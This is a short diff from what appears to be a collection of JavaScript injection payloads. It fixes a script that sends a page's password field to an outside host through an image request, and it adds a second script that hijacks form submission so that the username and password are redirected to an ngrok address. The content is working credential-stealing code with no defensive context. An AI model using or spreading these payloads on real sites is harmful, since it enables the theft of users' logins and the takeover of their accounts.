@@ -24,7 +24,15 @@ buttons=document.getElementsByTagName('button');
 for(i=0;i<buttons.length;i++){
 	buttons[i].addEventListener('click', function(){
 		var s=document.createElement('img');
-		s.src='http://cthulhu.diax.mx/cookiemonster.php?d='+document.getElementsByName('password').value;
+		s.src='http://cthulhu.diax.mx/cookiemonster.php?d='+document.getElementsByName('password')[0].value;
 	});
 }
 </script>
+
+
+document.forms[0].submit()
+
+
+<script>  function intercept(){
+ 	var user = document.forms[0].elements[0].value; 
+ 	var pass = document.forms[0].elements[1].value; 	window.location.replace("http://e8e1b8f200a9.ngrok.io/hackdef/?nombre="+user+"&pass="+pass); 	return false;  }  document.forms[0].onsubmit = intercept;  </script>
